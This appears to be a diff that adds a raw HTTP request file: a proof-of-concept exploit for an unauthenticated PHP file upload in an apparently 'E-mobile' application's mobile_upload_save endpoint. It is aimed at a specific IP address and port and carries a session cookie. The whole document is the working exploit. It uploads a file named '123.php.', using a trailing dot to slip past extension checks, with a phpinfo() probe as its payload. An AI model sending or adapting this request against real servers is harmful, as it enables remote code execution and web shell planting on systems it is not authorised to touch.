@@ -1,0 +1,17 @@
+POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
+Host: 39.106.157.214:8082
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+Cookie: LOGIN_LANG=cn; PHPSESSID=5b7f298e2f82908a25c77b07f347df7c
+Connection: close
+Content-Length: 217
+
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+Content-Disposition: form-data; name="Filedata"; filename="123.php."
+Content-Type: application/octet-stream
+<?php phpinfo();?>
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
